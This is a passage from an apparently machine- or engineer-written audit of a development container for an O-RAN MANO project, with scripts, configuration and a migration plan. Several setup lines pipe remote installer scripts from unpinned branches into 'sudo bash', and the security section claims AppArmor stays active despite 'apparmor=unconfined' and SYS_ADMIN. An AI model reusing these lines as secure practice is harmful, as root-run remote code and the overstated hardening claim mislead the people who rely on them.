go install github.com/go-delve/delve/cmd/dlv@latest
go install sigs.k8s.io/controller-runtime/tools/setup-envtest@latest
go install github.com/securego/gosec/v2/cmd/gosec@latest
go install honnef.co/go/tools/cmd/staticcheck@latest

# Install Python tools
echo "Installing Python development tools..."
pip install --no-cache-dir -r nlp/requirements.txt
pip install --no-cache-dir yamllint bandit black ruff mypy pytest pytest-cov

# Install security tools
echo "Installing security scanning tools..."
curl -sSfL https://github.com/gitleaks/gitleaks/releases/download/v8.18.0/gitleaks_8.18.0_linux_x64.tar.gz | \
  tar -xz -C /tmp/ && sudo mv /tmp/gitleaks /usr/local/bin/

# Install other tools
echo "Installing additional utilities..."
sudo apt-get update && sudo apt-get install -y --no-install-recommends \
  iperf3 \
  jq \
  && sudo rm -rf /var/lib/apt/lists/*

# Setup environment
echo "Configuring environment..."
[ -f .env ] || cp .env.sample .env

# Setup git hooks
if [ -d .git ]; then
  git config core.hooksPath .githooks
  chmod +x .githooks/*
fi

# Download envtest binaries
echo "Setting up controller-runtime test environment..."
K8S_VERSION=1.28.0
KUBEBUILDER_ASSETS=$(setup-envtest use ${K8S_VERSION} -p path)
echo "export KUBEBUILDER_ASSETS=${KUBEBUILDER_ASSETS}" >> ~/.bashrc

# Create directory structure
mkdir -p experiments clusters/{edge01,edge02,regional,central,local}

echo "✓ Development environment ready!"
echo "Run 'make help' to see available commands"
```

**Testing Plan:**
1. Rebuild container: `Ctrl+Shift+P` → "Dev Containers: Rebuild Container"
2. Verify tools: `go version`, `python --version`, `kubectl version --client`
3. Run tests: `make test-unit`
4. Check size: `docker images | grep devcontainers`

**Expected Results:**
- Image size: ~3.5 GB (vs 12 GB)
- Initial build: 5-8 minutes (one-time)
- Container start: 10-20 seconds (vs 60 seconds)
- postCreateCommand: 2-3 minutes (vs 5-7 minutes)

### Recommendation 3: Remove Privileged Mode

**Priority:** 🔴 CRITICAL (Security)
**Effort:** LOW (1 hour)
**Impact:** HIGH (Eliminates critical security risk)

**Change 1 - Replace docker-in-docker with docker-outside:**
```json
// OLD:
"ghcr.io/devcontainers/features/docker-in-docker:2": {}

// NEW:
"ghcr.io/devcontainers/features/docker-outside-of-docker:2": {
  "enableNonRootDocker": "true",
  "moby": false
}
```

**Change 2 - Update runArgs:**
```json
// OLD:
"runArgs": ["--init", "--privileged"]

// NEW:
"runArgs": [
  "--init",
  "--cap-add=NET_ADMIN",
  "--cap-add=SYS_ADMIN",
  "--security-opt=apparmor=unconfined",
  "--device=/dev/fuse"
]
```

**Change 3 - Update Kind usage in Makefile:**
No changes needed - Kind works with docker-outside-of-docker

**Testing:**
```bash
# Verify Docker access
docker ps

# Test Kind cluster creation
kind create cluster --name test

# Verify cluster
kubectl get nodes

# Cleanup
kind delete cluster --name test
```

**Security Improvement:**
- AppArmor still active (except for specific profile)
- SELinux remains active
- Seccomp filters active
- No access to non-mounted host devices
- Container escape significantly harder

### Recommendation 4: Pin All Tool Versions

**Priority:** ⚠️ HIGH
**Effort:** LOW (1 hour)
**Impact:** MEDIUM (Reproducible builds)

**Create .tool-versions file:**
```
# O-RAN Intent MANO Tool Versions
# Single source of truth for all tool versions

# Core Languages
golang 1.24.7
python 3.11.0
nodejs 20.11.0

# Kubernetes Tools
kubectl 1.31.0
helm 3.16.2
kind 0.23.0
k3s v1.28.5+k3s1
kubebuilder 3.15.1

# Build Tools
golangci-lint 1.54.0
gosec 2.18.0
staticcheck 2023.1.6

# Security Tools
gitleaks 8.18.0
trivy 0.45.0

# Utilities
act 0.2.50
```

**Update devcontainer.json to read versions:**
```bash
# In postCreateCommand script:
source .tool-versions
go install github.com/golangci/golangci-lint/cmd/golangci-lint@v${golangci-lint}
```

**Update CI workflows:**
```yaml
# Read from .tool-versions instead of hardcoding
- name: Set tool versions
  run: |
    echo "GO_VERSION=$(grep golang .tool-versions | cut -d' ' -f2)" >> $GITHUB_ENV
```

### Recommendation 5: Fix Missing Tools Installation

**Priority:** ⚠️ HIGH
**Effort:** MEDIUM (2 hours)
**Impact:** MEDIUM (Complete development environment)

**Add to .devcontainer/setup.sh:**
```bash
#!/bin/bash
set -euo pipefail

echo "Installing missing development tools..."

# KPT for Nephio package management
KPT_VERSION=v1.0.0-beta.49
curl -L "https://github.com/GoogleContainerTools/kpt/releases/download/${KPT_VERSION}/kpt_linux_amd64" -o /tmp/kpt
sudo mv /tmp/kpt /usr/local/bin/ && sudo chmod +x /usr/local/bin/kpt
echo "✓ KPT ${KPT_VERSION} installed"

# iperf3 for network testing
sudo apt-get update && sudo apt-get install -y --no-install-recommends iperf3
echo "✓ iperf3 installed"

# act for local CI testing
curl -s https://raw.githubusercontent.com/nektos/act/master/install.sh | sudo bash
echo "✓ act installed"

# setup-envtest for controller tests
go install sigs.k8s.io/controller-runtime/tools/setup-envtest@latest
K8S_VERSION=1.28.0
KUBEBUILDER_ASSETS=$(setup-envtest use ${K8S_VERSION} -p path)
echo "export KUBEBUILDER_ASSETS=${KUBEBUILDER_ASSETS}" >> ~/.bashrc
echo "✓ setup-envtest configured"

# Security scanning tools
go install github.com/securego/gosec/v2/cmd/gosec@latest
echo "✓ gosec installed"

curl -sSfL https://github.com/gitleaks/gitleaks/releases/download/v8.18.0/gitleaks_8.18.0_linux_x64.tar.gz | \
  tar -xz -C /tmp/ && sudo mv /tmp/gitleaks /usr/local/bin/
echo "✓ gitleaks installed"

curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | \
  sudo sh -s -- -b /usr/local/bin v0.45.0
echo "✓ trivy installed"

# Python linting tools
pip install --no-cache-dir yamllint bandit
echo "✓ Python linting tools installed"

echo "All development tools installed successfully!"
```

### Recommendation 6: Fix VS Code Settings for Modern Extensions

**Priority:** ⚠️ MEDIUM
**Effort:** LOW (30 minutes)
**Impact:** LOW (Better IDE experience)

**Update VS Code settings in devcontainer.json:**
```json
"settings": {
  // Go settings (modern Go extension)
  "go.toolsManagement.autoUpdate": true,
  "go.useLanguageServer": true,
  "go.lintTool": "golangci-lint",
  "go.lintOnSave": "package",
  "go.testFlags": ["-v", "-race"],
  "go.coverOnSave": false,
  "go.coverageDecorator": {
    "type": "gutter",
    "coveredHighlightColor": "rgba(64,128,64,0.5)",
    "uncoveredHighlightColor": "rgba(128,64,64,0.5)"
  },

  // Python settings (modern extension API)
  "[python]": {
    "editor.defaultFormatter": "ms-python.black-formatter",
    "editor.formatOnSave": true,
    "editor.codeActionsOnSave": {
      "source.organizeImports": "explicit"
    }
  },
  "python.testing.pytestEnabled": true,
  "python.testing.unittestEnabled": false,
  "python.analysis.typeCheckingMode": "basic",
  "python.analysis.autoImportCompletions": true,

  // YAML settings (fixed schema syntax)
  "yaml.schemas": {
    "kubernetes": ["*.yaml", "*.yml"],
    "https://json.schemastore.org/github-workflow.json": ".github/workflows/*.yml"
  },
  "yaml.format.enable": true,
  "yaml.validate": true,
  "yaml.completion": true,

  // Editor settings
  "editor.formatOnSave": true,
  "editor.formatOnPaste": false,
  "editor.rulers": [80, 120],
  "editor.bracketPairColorization.enabled": true,
  "editor.guides.bracketPairs": true,

  // File settings
  "files.trimTrailingWhitespace": true,
  "files.insertFinalNewline": true,
  "files.trimFinalNewlines": true,
  "files.exclude": {
    "**/.git": true,
    "**/__pycache__": true,
    "**/.pytest_cache": true,
    "**/.mypy_cache": true,
    "**/node_modules": true,
    "**/*.pyc": true
  },

  // Spell checker
  "cSpell.enabled": true,
  "cSpell.words": [
    "MANO", "ORAN", "Nephio", "Porch", "ConfigSync", "Kube",
    "VXLAN", "GitOps", "CRDs", "kubectl", "kustomize",
    "devcontainer", "ruff", "golangci", "shellcheck",
    "hadolint", "yamllint", "markdownlint", "aspell",
    "O2ims", "O2dms", "kubebuilder", "envtest", "iperf"
  ],

  // Makefile support
  "makefile.configureOnOpen": true,
  "makefile.launchConfigurations": [
    {
      "cwd": "/workspace",
      "binaryPath": "/workspace/bin",
      "binaryArgs": []
    }
  ],

  // Coverage gutters
  "coverage-gutters.coverageFileNames": [
    "coverage.out",
    "coverage.xml",
    ".coverage"
  ],
  "coverage-gutters.coverageBaseDir": "**",

  // Terminal
  "terminal.integrated.defaultProfile.linux": "bash",
  "terminal.integrated.profiles.linux": {
    "bash": {
      "path": "/bin/bash",
      "icon": "terminal-bash"
    }
  }
}
```

### Recommendation 7: Optimize Lifecycle Commands

**Priority:** ⚠️ MEDIUM
**Effort:** MEDIUM (2 hours)
**Impact:** MEDIUM (Faster initialization)

**Current Issue:** bootstrap.sh and make setup are redundant

**New Lifecycle Commands:**
```json
{
  "postCreateCommand": "bash .devcontainer/setup.sh",
  "postStartCommand": "bash .devcontainer/health-check.sh",
  "postAttachCommand": "echo '✓ O-RAN MANO DevContainer Ready! Run: make help'"
}
```

**.devcontainer/health-check.sh:**
```bash
#!/bin/bash
# Quick health check on container start

echo "Verifying development environment..."

# Check core tools
command -v go >/dev/null 2>&1 || { echo "✗ Go not found"; exit 1; }
command -v python3 >/dev/null 2>&1 || { echo "✗ Python not found"; exit 1; }
command -v kubectl >/dev/null 2>&1 || { echo "✗ kubectl not found"; exit 1; }
command -v kind >/dev/null 2>&1 || { echo "✗ Kind not found"; exit 1; }
command -v docker >/dev/null 2>&1 || { echo "✗ Docker not found"; exit 1; }

# Check Go version
GO_VERSION=$(go version | awk '{print $3}' | sed 's/go//')
if [[ "$GO_VERSION" != "1.24.7" ]]; then
  echo "⚠ Go version mismatch: expected 1.24.7, got $GO_VERSION"
fi

# Check if .env exists
if [ ! -f .env ]; then
  echo "⚠ .env not found, creating from sample..."
  cp .env.sample .env
fi

# Check Docker connectivity
if ! docker ps >/dev/null 2>&1; then
  echo "⚠ Docker daemon not accessible"
fi

echo "✓ All core tools ready"
```

---

## 8. COMPLETE OPTIMIZED CONFIGURATION

### Final Recommended devcontainer.json

```json
{
  "name": "O-RAN Intent MANO Development",
  "image": "mcr.microsoft.com/devcontainers/go:1.24",

  "features": {
    "ghcr.io/devcontainers/features/python:1": {
      "version": "3.11",
      "installTools": true,
      "optimize": true
    },
    "ghcr.io/devcontainers/features/node:1": {
      "version": "20",
      "nodeGypDependencies": false,
      "nvmVersion": "latest"
    },
    "ghcr.io/devcontainers/features/docker-outside-of-docker:2": {
      "version": "latest",
      "enableNonRootDocker": "true",
      "moby": false
    },
    "ghcr.io/devcontainers/features/kubectl-helm-minikube:1": {
      "version": "latest",
      "kubectl": "1.31.0",
      "helm": "3.16.2",
      "minikube": "none"
    },
    "ghcr.io/devcontainers/features/git:1": {
      "version": "latest",
      "ppa": false
    },
    "ghcr.io/devcontainers-contrib/features/kind:1": {
      "version": "0.23.0"
    },
    "ghcr.io/devcontainers-contrib/features/k3s-asdf:2": {
      "version": "v1.28.5+k3s1"
    },
    "ghcr.io/devcontainers-contrib/features/kubebuilder:1": {
      "version": "3.15.1"
    }
  },

  "customizations": {
    "vscode": {
      "extensions": [
        // Go Development
        "golang.go",

        // Python Development
        "ms-python.python",
        "ms-python.vscode-pylance",
        "ms-python.black-formatter",

        // Kubernetes & YAML
        "redhat.vscode-yaml",
        "ms-kubernetes-tools.vscode-kubernetes-tools",

        // Docker
        "ms-azuretools.vscode-docker",

        // Code Quality
        "esbenp.prettier-vscode",
        "streetsidesoftware.code-spell-checker",
        "timonwong.shellcheck",
        "foxundermoon.shell-format",
        "usernamehw.errorlens",

        // Testing & Coverage
        "premparihar.gotestexplorer",
        "ryanluker.vscode-coverage-gutters",

        // Build Tools
        "ms-vscode.makefile-tools",

        // Git (optional, user preference)
        "eamodio.gitlens",
        "mhutchie.git-graph"
      ],

      "settings": {
        // Go Configuration
        "go.toolsManagement.autoUpdate": true,
        "go.useLanguageServer": true,
        "go.lintTool": "golangci-lint",
        "go.lintOnSave": "package",
        "go.testFlags": ["-v", "-race"],
        "go.coverOnSave": false,
        "go.coverageDecorator": {
          "type": "gutter",
          "coveredHighlightColor": "rgba(64,128,64,0.5)",
          "uncoveredHighlightColor": "rgba(128,64,64,0.5)"
        },
        "go.buildFlags": ["-tags=integration"],
        "go.testEnvVars": {
          "KUBEBUILDER_ASSETS": "${env:KUBEBUILDER_ASSETS}"
        },

        // Python Configuration
        "[python]": {
          "editor.defaultFormatter": "ms-python.black-formatter",
          "editor.formatOnSave": true,
          "editor.codeActionsOnSave": {
            "source.organizeImports": "explicit"
          }
        },
        "python.testing.pytestEnabled": true,
        "python.testing.unittestEnabled": false,
        "python.analysis.typeCheckingMode": "basic",
        "python.analysis.autoImportCompletions": true,

        // YAML Configuration
        "yaml.schemas": {
          "kubernetes": ["*.yaml", "*.yml"],
          "https://json.schemastore.org/github-workflow.json": ".github/workflows/*.yml",
          "https://json.schemastore.org/kustomization.json": "kustomization.yaml"
        },
        "yaml.format.enable": true,
        "yaml.validate": true,
        "yaml.completion": true,
        "yaml.customTags": [
          "!reference sequence"
        ],

        // Editor Settings
        "editor.formatOnSave": true,
        "editor.formatOnPaste": false,
        "editor.rulers": [80, 120],
        "editor.bracketPairColorization.enabled": true,
        "editor.guides.bracketPairs": true,
        "editor.codeActionsOnSave": {
          "source.organizeImports": "explicit"
        },

        // File Settings
        "files.trimTrailingWhitespace": true,
        "files.insertFinalNewline": true,
        "files.trimFinalNewlines": true,
        "files.eol": "\n",
        "files.exclude": {
          "**/.git": true,
          "**/__pycache__": true,
          "**/.pytest_cache": true,
          "**/.mypy_cache": true,
          "**/node_modules": true,
          "**/*.pyc": true,
          "**/.DS_Store": true,
          "**/vendor": true
        },
        "files.watcherExclude": {
          "**/.git/objects/**": true,
          "**/.git/subtree-cache/**": true,
          "**/node_modules/**": true,
          "**/vendor/**": true,
          "**/__pycache__/**": true
        },

        // Spell Checker
        "cSpell.enabled": true,
        "cSpell.words": [
          "MANO", "ORAN", "Nephio", "Porch", "ConfigSync", "Kube",
          "VXLAN", "GitOps", "CRDs", "kubectl", "kustomize",
          "devcontainer", "ruff", "golangci", "shellcheck",
          "hadolint", "yamllint", "markdownlint", "aspell",
          "O2ims", "O2dms", "kubebuilder", "envtest", "iperf",
          "GOPATH", "GOROOT", "GOCACHE", "pytest", "pylance",
          "VNF", "RAN", "DMS", "TN"
        ],
        "cSpell.enableFiletypes": [
          "dockerfile",
          "shellscript",
          "yaml",
          "makefile"
        ],

        // Makefile Support
        "makefile.configureOnOpen": true,
        "makefile.launchConfigurations": [
          {
            "cwd": "/workspace",
            "binaryPath": "/workspace/bin",
            "binaryArgs": []
          }
        ],

        // Coverage Gutters
        "coverage-gutters.coverageFileNames": [
          "coverage.out",
          "coverage.xml",
          ".coverage",
          "lcov.info"
        ],
        "coverage-gutters.coverageBaseDir": "**",
        "coverage-gutters.showLineCoverage": true,
        "coverage-gutters.showRulerCoverage": true,

        // Terminal
        "terminal.integrated.defaultProfile.linux": "bash",
        "terminal.integrated.profiles.linux": {
          "bash": {
            "path": "/bin/bash",
            "icon": "terminal-bash",
            "env": {
              "KUBEBUILDER_ASSETS": "${env:KUBEBUILDER_ASSETS}"
            }
          }
        },
        "terminal.integrated.scrollback": 10000,

        // Search
        "search.exclude": {
          "**/node_modules": true,
          "**/vendor": true,
          "**/.venv": true,
          "**/__pycache__": true,
          "**/*.pyc": true
        }
      }
    }
  },

  "postCreateCommand": "bash .devcontainer/setup.sh",
  "postStartCommand": "bash .devcontainer/health-check.sh",
  "postAttachCommand": "echo '\n✓ O-RAN MANO DevContainer Ready!\nRun: make help\n'",

  "remoteUser": "vscode",

  "mounts": [],

  "runArgs": [
    "--init",
    "--cap-add=NET_ADMIN",
    "--cap-add=SYS_ADMIN",
    "--security-opt=apparmor=unconfined"
  ],

  "containerEnv": {
    "SHELL": "/bin/bash",
    "PYTHONPATH": "/workspace",
    "CGO_ENABLED": "1",
    "GOCACHE": "/go/cache",
    "PATH": "/usr/local/go/bin:/go/bin:${PATH}:/workspace/scripts",
    "GO_VERSION": "1.24.7",
    "PYTHON_VERSION": "3.11",
    "NODE_VERSION": "20",
    "KUBECTL_VERSION": "1.31.0"
  },

  "workspaceFolder": "/workspace",
  "workspaceMount": "source=${localWorkspaceFolder},target=/workspace,type=bind"
}
```

### Supporting Scripts

**.devcontainer/setup.sh:**
```bash
#!/bin/bash
# O-RAN Intent MANO Development Environment Setup
set -euo pipefail

echo "================================================================"
echo "Setting up O-RAN Intent MANO development environment..."
echo "================================================================"

# Install Go development tools
echo "[1/6] Installing Go development tools..."
go install github.com/golangci/golangci-lint/cmd/golangci-lint@v1.54.0
go install golang.org/x/tools/cmd/goimports@latest
go install github.com/go-delve/delve/cmd/dlv@latest
go install sigs.k8s.io/controller-runtime/tools/setup-envtest@latest
go install github.com/securego/gosec/v2/cmd/gosec@v2.18.0
go install honnef.co/go/tools/cmd/staticcheck@2023.1.6
echo "✓ Go tools installed"

# Install Python dependencies
echo "[2/6] Installing Python dependencies..."
if [ -f "nlp/requirements.txt" ]; then
  pip install --no-cache-dir -r nlp/requirements.txt
fi
pip install --no-cache-dir yamllint bandit ruff mypy
echo "✓ Python tools installed"

# Install security scanning tools
echo "[3/6] Installing security scanning tools..."
GITLEAKS_VERSION=8.18.0
curl -sSfL "https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/gitleaks_${GITLEAKS_VERSION}_linux_x64.tar.gz" | \
  tar -xz -C /tmp/ && sudo mv /tmp/gitleaks /usr/local/bin/
sudo chmod +x /usr/local/bin/gitleaks

TRIVY_VERSION=0.45.0
curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | \
  sudo sh -s -- -b /usr/local/bin v${TRIVY_VERSION}
echo "✓ Security tools installed"

# Install additional utilities
echo "[4/6] Installing additional utilities..."
sudo apt-get update && sudo apt-get install -y --no-install-recommends \
  iperf3 \
  jq \
  tree \
  && sudo rm -rf /var/lib/apt/lists/*

# Install KPT for Nephio
KPT_VERSION=v1.0.0-beta.49
curl -L "https://github.com/GoogleContainerTools/kpt/releases/download/${KPT_VERSION}/kpt_linux_amd64" -o /tmp/kpt
sudo mv /tmp/kpt /usr/local/bin/kpt && sudo chmod +x /usr/local/bin/kpt

# Install act for local CI
curl -s https://raw.githubusercontent.com/nektos/act/master/install.sh | sudo bash -s -- -b /usr/local/bin
echo "✓ Utilities installed"

# Setup environment
echo "[5/6] Configuring environment..."

# Create .env if doesn't exist
if [ ! -f .env ]; then
  if [ -f .env.sample ]; then
    cp .env.sample .env
    echo "✓ Created .env from sample"
  else
    echo "⚠ No .env.sample found"
  fi
fi

# Setup git hooks
if [ -d .git ]; then
  if [ -d .githooks ]; then
    git config --local core.hooksPath .githooks
    chmod +x .githooks/* 2>/dev/null || true
    echo "✓ Git hooks configured"
  fi
fi

# Setup envtest for controller tests
K8S_VERSION=1.28.0
echo "Setting up controller-runtime test environment..."
KUBEBUILDER_ASSETS=$(setup-envtest use ${K8S_VERSION} -p path 2>/dev/null || echo "")
if [ -n "$KUBEBUILDER_ASSETS" ]; then
  echo "export KUBEBUILDER_ASSETS=${KUBEBUILDER_ASSETS}" >> ~/.bashrc
  echo "✓ KUBEBUILDER_ASSETS configured: ${KUBEBUILDER_ASSETS}"
else
  echo "⚠ Failed to setup envtest assets"
fi

# Create necessary directories
echo "[6/6] Creating directory structure..."
mkdir -p \
  experiments \
  clusters/{edge01,edge02,regional,central,local} \
  nlp/tests \
  orchestrator/tests \
  adapters/vnf-operator/tests

echo "✓ Directories created"

echo "================================================================"
echo "✓ Development environment setup complete!"
echo "================================================================"
echo ""
echo "Quick start:"
echo "  make help    - Show available commands"
echo "  make check   - Run all quality checks"
echo "  make kind    - Create local Kubernetes cluster"
echo "  make test    - Run test suite"
echo ""
echo "Tool versions:"
echo "  Go:      $(go version | awk '{print $3}')"
echo "  Python:  $(python3 --version | awk '{print $2}')"
echo "  kubectl: $(kubectl version --client --short 2>&1 | grep -oP 'v[\d\.]+' | head -1)"
echo "  Kind:    $(kind version 2>&1 | grep -oP 'v[\d\.]+' || echo 'not found')"
echo "  Helm:    $(helm version --short 2>&1 | grep -oP 'v[\d\.]+' || echo 'not found')"
echo ""
```

**.devcontainer/health-check.sh:**
```bash
#!/bin/bash
# Quick health check on container start

echo "Verifying development environment..."

ERRORS=0

# Check core tools
check_tool() {
  if ! command -v "$1" >/dev/null 2>&1; then
    echo "✗ $1 not found"
    ((ERRORS++))
    return 1
  fi
  echo "✓ $1"
  return 0
}

check_tool go
check_tool python3
check_tool node
check_tool kubectl
check_tool kind
check_tool helm
check_tool docker

# Check Go version
GO_VERSION=$(go version 2>&1 | awk '{print $3}' | sed 's/go//')
if [[ "$GO_VERSION" == "1.24.7" ]]; then
  echo "✓ Go version: $GO_VERSION"
else
  echo "⚠ Go version mismatch: expected 1.24.7, got $GO_VERSION"
fi

# Check if .env exists
if [ -f .env ]; then
  echo "✓ .env file present"
else
  echo "⚠ .env not found"
  if [ -f .env.sample ]; then
    cp .env.sample .env
    echo "  Created from .env.sample"
  fi
fi

# Check Docker connectivity
if docker ps >/dev/null 2>&1; then
  echo "✓ Docker daemon accessible"
else
  echo "⚠ Docker daemon not accessible (may need to start Docker)"
fi

# Check KUBEBUILDER_ASSETS
if [ -n "${KUBEBUILDER_ASSETS:-}" ] && [ -d "$KUBEBUILDER_ASSETS" ]; then
  echo "✓ KUBEBUILDER_ASSETS configured"
else
  echo "⚠ KUBEBUILDER_ASSETS not set (run: source ~/.bashrc)"
fi

if [ $ERRORS -eq 0 ]; then
  echo ""
  echo "✓ All checks passed - ready for development!"
else
  echo ""
  echo "⚠ $ERRORS check(s) failed - some features may not work"
fi
```

---

## 9. MIGRATION PLAN

### Phase 1: Critical Fixes (Week 1)

**Priority:** 🔴 CRITICAL
**Goal:** Fix version mismatches and security issues

**Tasks:**
1. ✅ Standardize Go version to 1.24.7 across all workflows
   - Update test.yml, docker-build.yml, dependency-review.yml, codeql.yml
   - Test: Run CI workflows
   - Estimate: 1 hour

2. ✅ Remove privileged mode, implement docker-outside-of-docker
   - Update devcontainer.json features
   - Update runArgs with specific capabilities
   - Test: Verify Docker access, Kind cluster creation
   - Estimate: 2 hours

3. ✅ Pin all tool versions (kubectl, helm, kind, k3s)
   - Create .tool-versions file
   - Update devcontainer.json
   - Update Makefile
   - Test: Verify consistent versions
   - Estimate: 1 hour

**Rollback Plan:** Keep old devcontainer.json as `.devcontainer/devcontainer.json.backup`

### Phase 2: Performance Optimization (Week 2)

**Priority:** ⚠️ HIGH
**Goal:** Reduce image size and initialization time

**Tasks:**
1. ✅ Replace universal image with Go base image
   - Update devcontainer.json base image
   - Add necessary features
   - Test: Full rebuild and initialization
   - Estimate: 3 hours

2. ✅ Create optimized setup scripts
   - Write .devcontainer/setup.sh
   - Write .devcontainer/health-check.sh
   - Update lifecycle commands
   - Test: Container creation and startup
   - Estimate: 2 hours

3. ✅ Install missing development tools
   - Add KPT, iperf3, act, security scanners
   - Update setup script
   - Test: Verify all tools available
   - Estimate: 2 hours

**Testing:** Compare initialization time and container size before/after

### Phase 3: Developer Experience (Week 3)

**Priority:** ⚠️ MEDIUM
**Goal:** Improve IDE configuration and tooling

**Tasks:**
1. ✅ Update VS Code settings and extensions
   - Fix deprecated Python extension settings
   - Add missing extensions (Makefile tools, coverage gutters, etc.)
   - Update YAML schema configuration
   - Test: Open project in VS Code, verify linting/formatting
   - Estimate: 2 hours

2. ✅ Add comprehensive spell checker dictionary
   - Already done (lines 60-82), verify completeness
   - Add any missing project-specific terms
   - Estimate: 30 minutes

3. ✅ Configure test discovery and coverage
   - Setup Go test explorer
   - Configure coverage gutters
   - Test: Run tests from VS Code UI
   - Estimate: 1 hour

**Success Metrics:**
- All linters work in VS Code
- Tests can be run/debugged from UI
- Coverage display works

### Phase 4: Documentation (Week 4)

**Priority:** ⚠️ LOW
**Goal:** Document changes and provide migration guide

**Tasks:**
1. ✅ Update README with new devcontainer info
   - Document required tools and versions
   - Add troubleshooting section
   - Estimate: 2 hours

2. ✅ Create DEVELOPMENT.md guide
   - Setup instructions
   - Common tasks (run tests, create cluster, etc.)
   - Debugging tips
   - Estimate: 3 hours

3. ✅ Update CI/CD documentation
   - Document version consistency requirements
   - Add local CI testing with act
   - Estimate: 1 hour

---

## 10. TESTING & VALIDATION CHECKLIST

### Pre-Migration Testing
- [ ] Backup current devcontainer.json
- [ ] Document current initialization time
- [ ] Document current container size
- [ ] List all currently working features

### Post-Migration Testing

#### Basic Functionality
- [ ] Container builds without errors
- [ ] All tools are accessible (go, python, kubectl, kind, helm)
- [ ] Correct versions installed:
  - [ ] Go 1.24.7
  - [ ] Python 3.11
  - [ ] Node 20
  - [ ] kubectl 1.31.0
  - [ ] Helm 3.16.2
  - [ ] Kind 0.23.0
  - [ ] K3s v1.28.5+k3s1

#### Development Workflow
- [ ] Can read/write files in workspace
- [ ] Git operations work
- [ ] Make commands execute successfully:
  - [ ] `make help`
  - [ ] `make check`
  - [ ] `make lint`
  - [ ] `make format`
- [ ] Go development works:
  - [ ] IntelliSense/autocomplete
  - [ ] Go to definition
  - [ ] Run tests from VS Code
  - [ ] Debug tests
- [ ] Python development works:
  - [ ] Linting (Black, Ruff)
  - [ ] Run pytest
  - [ ] Import resolution
- [ ] YAML validation works for Kubernetes files

#### Kubernetes Testing
- [ ] Docker daemon accessible: `docker ps`
- [ ] Can create Kind cluster: `make kind` or `kind create cluster`
- [ ] kubectl works: `kubectl get nodes`
- [ ] Can load images into Kind
- [ ] Can deploy to cluster
- [ ] K3s can start (Linux only)

#### Security Testing
- [ ] Container is NOT running in privileged mode
- [ ] Specific capabilities are sufficient
- [ ] Docker-outside-of-docker works
- [ ] gitleaks scan runs: `gitleaks detect`
- [ ] gosec scan runs: `gosec ./...`
- [ ] trivy scan works: `trivy image <image>`

#### Performance Testing
- [ ] Container start time < 30 seconds
- [ ] Initial setup completes < 5 minutes
- [ ] Image size < 5 GB
- [ ] No redundant tool installations

#### CI/CD Integration
- [ ] Local CI runs with act: `make ci-local`
- [ ] Go version matches CI workflows
- [ ] All CI jobs pass on push

#### Extension Testing
- [ ] All extensions load without errors
- [ ] Linting works for Go, Python, YAML, Shell
- [ ] Code formatting works on save
- [ ] Spell checker active
- [ ] GitLens shows git history (if installed)
- [ ] Makefile extension provides task list

### Rollback Procedure
If critical issues found:
1. Rename current `.devcontainer/devcontainer.json` to `.devcontainer/devcontainer.json.new`
2. Restore `.devcontainer/devcontainer.json.backup`
3. Rebuild container: `Ctrl+Shift+P` → "Dev Containers: Rebuild Container"
4. Document issues encountered
5. Create GitHub issue with error logs

---

## 11. APPENDIX

### A. Version Compatibility Matrix

| Component | Current | Recommended | CI (main) | CI (other) | Compatible |
|-----------|---------|-------------|-----------|------------|------------|
| Go | 1.24.7 | 1.24.7 | 1.24.7 | 1.22.10 | ❌ **Fix CI** |
| Python | 3.11 | 3.11 | N/A | 3.12 | ✅ Minor |
| Node.js | 20 | 20 | N/A | 20 | ✅ Yes |
| kubectl | latest | 1.31.0 | 1.31.0 | N/A | ⚠️ **Pin version** |
| Helm | latest | 3.16.2 | 3.16.2 | N/A | ⚠️ **Pin version** |
| Kind | latest | 0.23.0 | 0.23.0 | N/A | ⚠️ **Pin version** |
| K3s | latest | v1.28.5+k3s1 | N/A | N/A | ⚠️ **Pin version** |
| Kubebuilder | N/A | 3.15.1 | 3.15.1 | N/A | ❌ **Add feature** |

### B. File Size Comparison

| Image | Compressed | Uncompressed | Layers | Pull Time (100Mbps) |
|-------|-----------|--------------|--------|---------------------|
| universal:2-linux (current) | ~4 GB | ~12 GB | 50+ | 5-8 min |
| go:1.24 (recommended) | ~1.2 GB | ~3.5 GB | 20 | 2-3 min |
| Custom Dockerfile (optimal) | ~800 MB | ~2.5 GB | 15 | 1-2 min |

**Savings:** 75% reduction in size, 70% reduction in pull time

### C. Tool Installation Times

| Tool | Installation Method | Time (universal) | Time (go:1.24) | Time (custom) |
|------|-------------------|------------------|----------------|---------------|
| Go tools | postCreateCommand | 60-120s | 40-60s | 0s (pre-installed) |
| Python packages | postCreateCommand | 30-60s | 20-30s | 0s (pre-installed) |
| kubectl/helm | Feature | 20-30s | 15-20s | 0s (pre-installed) |
| Kind/K3s | Feature | 30-40s | 20-30s | 10-15s |
| Security tools | postCreateCommand | 40-60s | 30-40s | 0s (pre-installed) |
| **Total** | | **180-310s** | **125-180s** | **10-15s** |

### D. Security Risk Assessment

| Risk | Severity | Current | Recommended | Mitigation |
|------|----------|---------|-------------|------------|
| Privileged container | 🔴 CRITICAL | YES | NO | Use docker-outside-of-docker |
| .env secrets exposure | ⚠️ HIGH | YES | NO | Use env vars, not file mount |
| PATH injection | ⚠️ MEDIUM | YES | NO | Move workspace scripts to end |
| Latest version drift | ⚠️ MEDIUM | YES | NO | Pin all versions |
| Outdated dependencies | ⚠️ LOW | NO | NO | Regular updates |

### E. Missing Tools Impact Analysis

| Tool | Required For | Impact if Missing | Priority |
|------|-------------|-------------------|----------|
| Kubebuilder | Operator tests | Tests fail | 🔴 CRITICAL |
| setup-envtest | Controller tests | Tests fail | 🔴 CRITICAL |
| iperf3 | Network tests | Network tests fail | ⚠️ HIGH |
| KPT | Nephio integration | Package rendering fails | ⚠️ HIGH |
| gosec | Security scans | No security validation | ⚠️ MEDIUM |
| gitleaks | Secret scanning | Secret leaks | ⚠️ MEDIUM |
| trivy | Container scanning | Vulnerable images | ⚠️ MEDIUM |
| act | Local CI testing | Can't test CI locally | ⚠️ LOW |

### F. CI Workflow Version Audit

**Files with Version Specifications:**

1. **.github/workflows/ci.yml** (PRIMARY - CORRECT)
   - GO_VERSION: '1.24.7' ✅
   - KIND_VERSION: 'v0.23.0' ✅
   - KUBECTL_VERSION: 'v1.31.0' ✅
   - HELM_VERSION: 'v3.16.2' ✅

2. **.github/workflows/test.yml** (INCORRECT - NEEDS UPDATE)
